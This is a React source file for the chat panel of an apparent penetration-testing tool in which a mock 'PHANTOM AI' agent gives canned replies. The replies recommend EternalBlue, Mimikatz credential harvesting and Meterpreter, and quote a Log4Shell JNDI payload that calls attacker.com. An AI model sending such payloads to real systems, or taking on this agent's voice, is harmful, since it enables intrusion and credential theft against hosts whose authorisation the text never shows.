// src/renderer/src/features/Tool/components/RightPanel/AgentPanel/index.tsx
import { useState, useRef, useEffect } from 'react'
import { cn } from '../../../../../shared/lib/utils'

// ─── Types ───────────────────────────────────────────────────────────────────

type MessageRole = 'user' | 'agent'

interface Message {
  id: string
  role: MessageRole
  content: string
  ts: string
}

// ─── Mock agent responses ─────────────────────────────────────────────────────

const AGENT_REPLIES: Record<string, string> = {
  default: 'Analyzing target context... Based on the current scan data, I recommend focusing on the exposed SMB service (port 445) first. EternalBlue (MS17-010) remains unpatched on this host.',
  recon:   'Running passive recon on the active sub-target. DNS enumeration shows 16 subdomains. TXT records reveal SPF and Google Workspace integration — possible phishing vector.',
  vuln:    'Top priority: CVE-2021-44228 (Log4Shell) on port 8080. CVSS 10.0 — unauthenticated RCE. Suggested payload: `${jndi:ldap://attacker.com/exploit}` in User-Agent header.',
  exploit: 'For the current target (Windows Server), I suggest chaining MS17-010 → Mimikatz for credential harvesting. Session upgrade to Meterpreter recommended after initial shell.',
  help:    'Available commands:\n• `recon` — suggest recon approach\n• `vuln` — analyze top vulnerabilities\n• `exploit` — suggest exploit chain\n• `scan <target>` — initiate scan\n• `report` — generate attack summary',
}

function getMockReply(input: string): string {
  const lower = input.toLowerCase()
  if (lower.includes('recon') || lower.includes('osint'))    return AGENT_REPLIES.recon
  if (lower.includes('vuln') || lower.includes('cve'))       return AGENT_REPLIES.vuln
  if (lower.includes('exploit') || lower.includes('attack')) return AGENT_REPLIES.exploit
  if (lower.includes('help') || lower === '?')               return AGENT_REPLIES.help
  return AGENT_REPLIES.default
}

function now(): string {
  return new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })
}

// ─── MessageBubble ────────────────────────────────────────────────────────────

function MessageBubble({ msg }: { msg: Message }) {
  const isUser = msg.role === 'user'
  return (
    <div className={cn('flex flex-col gap-0.5 mb-3', isUser && 'items-end')}>
      <div className="flex items-center gap-1.5 mb-0.5">
        {!isUser && (
          <span className="text-[9px] font-bold text-cyan-400 uppercase tracking-wider">Agent</span>
        )}
        <span className="text-[9px] text-[#3d4a61] font-mono">{msg.ts}</span>
        {isUser && (
          <span className="text-[9px] font-bold text-[#6b7a96] uppercase tracking-wider">You</span>
        )}
      </div>
      <div className={cn(
        'text-[11px] leading-[1.55] px-2.5 py-2 rounded-md max-w-[92%] whitespace-pre-wrap break-words',
        isUser
          ? 'bg-[#1a2035] border border-[#252e42] text-[#c5cfe0] rounded-br-sm'
          : 'bg-cyan-500/6 border border-cyan-500/15 text-[#c5cfe0] rounded-bl-sm'
      )}>
        {msg.content}
      </div>
    </div>
  )
}

// ─── AgentPanel (main export) ─────────────────────────────────────────────────

const INITIAL_MESSAGES: Message[] = [
  {
    id: '0',
    role: 'agent',
    content: 'PHANTOM AI online. I have context on the active target. Ask me about recon, vulnerabilities, exploit chains, or type `help` for commands.',
    ts: '09:41:00',
  },
]

export function AgentPanel() {
  const [messages, setMessages] = useState<Message[]>(INITIAL_MESSAGES)
  const [input, setInput]       = useState('')
  const [thinking, setThinking] = useState(false)
  const bottomRef               = useRef<HTMLDivElement>(null)

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [messages, thinking])

  function send() {
    const text = input.trim()
    if (!text || thinking) return

    const userMsg: Message = { id: Date.now().toString(), role: 'user', content: text, ts: now() }
    setMessages((m) => [...m, userMsg])
    setInput('')
    setThinking(true)

    setTimeout(() => {
      const reply: Message = {
        id: (Date.now() + 1).toString(),
        role: 'agent',
        content: getMockReply(text),
        ts: now(),
      }
      setMessages((m) => [...m, reply])
      setThinking(false)
    }, 800 + Math.random() * 600)
  }

  function onKey(e: React.KeyboardEvent<HTMLTextAreaElement>) {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault()
      send()
    }
  }

  return (
    <div className="flex flex-col overflow-hidden" style={{ height: '70%' }}>
      {/* header */}
      <div className="flex items-center gap-2 px-3 h-[38px] border-b border-[#1e2535] bg-[#0f1319] shrink-0">
        <svg className="w-3.5 h-3.5 text-cyan-400 shrink-0" viewBox="0 0 16 16" fill="none" stroke="currentColor" strokeWidth="1.4">
          <rect x="2" y="3" width="12" height="10" rx="2"/>
          <path d="M5 7h6M5 10h3"/>
          <circle cx="12" cy="10" r="1" fill="currentColor"/>
        </svg>
        <span className="font-[Rajdhani,sans-serif] text-[13px] font-bold tracking-wider text-[#c5cfe0] uppercase flex-1">
          Agent
        </span>
        <span className="flex items-center gap-1 text-[9px] text-green-400">
          <span className="w-1 h-1 rounded-full bg-green-400 animate-pulse" />
          online
        </span>
      </div>

      {/* message list */}
      <div className="flex-1 overflow-y-auto px-2.5 py-2.5 [&::-webkit-scrollbar]:w-[3px] [&::-webkit-scrollbar-thumb]:bg-[#252e42] [&::-webkit-scrollbar-thumb]:rounded-sm">
        {messages.map((m) => <MessageBubble key={m.id} msg={m} />)}

        {thinking && (
          <div className="flex items-center gap-2 mb-3">
            <span className="text-[9px] font-bold text-cyan-400 uppercase tracking-wider">Agent</span>
            <div className="flex items-center gap-1 px-2.5 py-2 bg-cyan-500/6 border border-cyan-500/15 rounded-md rounded-bl-sm">
              <span className="w-1 h-1 bg-cyan-400 rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
              <span className="w-1 h-1 bg-cyan-400 rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
              <span className="w-1 h-1 bg-cyan-400 rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
            </div>
          </div>
        )}
        <div ref={bottomRef} />
      </div>

      {/* input */}
      <div className="px-2.5 pb-2.5 shrink-0">
        <div className="flex items-end gap-1.5 bg-[#111520] border border-[#252e42] rounded-md focus-within:border-cyan-500/40 transition-colors">
          <textarea
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyDown={onKey}
            placeholder="Ask agent... (Enter to send)"
            rows={2}
            className="flex-1 bg-transparent resize-none px-2.5 py-2 text-[11px] text-[#c5cfe0] placeholder-[#3d4a61] outline-none font-mono leading-relaxed [&::-webkit-scrollbar]:w-0"
          />
          <button
            onClick={send}
            disabled={!input.trim() || thinking}
            className={cn(
              'mb-1.5 mr-1.5 w-6 h-6 rounded flex items-center justify-center transition-all shrink-0',
              input.trim() && !thinking
                ? 'bg-cyan-500/15 text-cyan-400 hover:bg-cyan-500/25'
                : 'text-[#3d4a61] cursor-not-allowed'
            )}
          >
            <svg className="w-3.5 h-3.5" viewBox="0 0 16 16" fill="none" stroke="currentColor" strokeWidth="1.5">
              <path d="M14 8L2 2l3 6-3 6z"/>
            </svg>
          </button>
        </div>
        <div className="text-[8.5px] text-[#3d4a61] mt-1 px-0.5">↵ send · Shift+↵ newline</div>
      </div>
    </div>
  )
}
